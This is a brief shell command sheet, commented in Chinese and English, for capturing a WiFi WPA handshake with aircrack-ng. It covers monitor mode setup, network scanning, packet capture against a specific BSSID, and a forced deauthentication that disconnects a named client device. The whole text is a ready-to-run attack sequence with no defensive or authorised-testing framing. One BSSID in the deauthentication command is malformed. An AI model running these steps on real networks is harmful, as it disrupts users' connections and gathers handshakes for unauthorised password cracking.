# install aircrack-ng: includes airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
sudo apt install aircrack-ng

# 查看网卡是否支持
airmon-ng

# There are processes to choke airmo-ng, so we kill them if they exist.
airmon-ng check kill

# airmon-ng 开启监听模式
airmon-ng start wlan0

# 查看是否进入监听模式
iwconfig

# airodump-ng 扫描周围 WiFi 网络
airodump-ng wlan0mon

# airodump-ng 开始抓包
# airodump-ng -c {CH} --bssid {BSSID} -w {要保存握手包的目录} {无线网卡名称}
airodump-ng -c 1 --bssid 70:AF:6A:8E:11:D3 -w /home/volume/pro wlan0mon

# 强制重连
# aireplay-ng -0 {发送反认证包的个数} -a {BSSID} -c {强制下线的MAC地址(STATION下面的地址)} {无线网卡名称}
aireplay-ng -0 2 -a 46:99:66:F9:84 -c B8:E8:56:09:CC:9C wlan0mon

# airmon-ng 退出
airmon-ng stop wlan0mon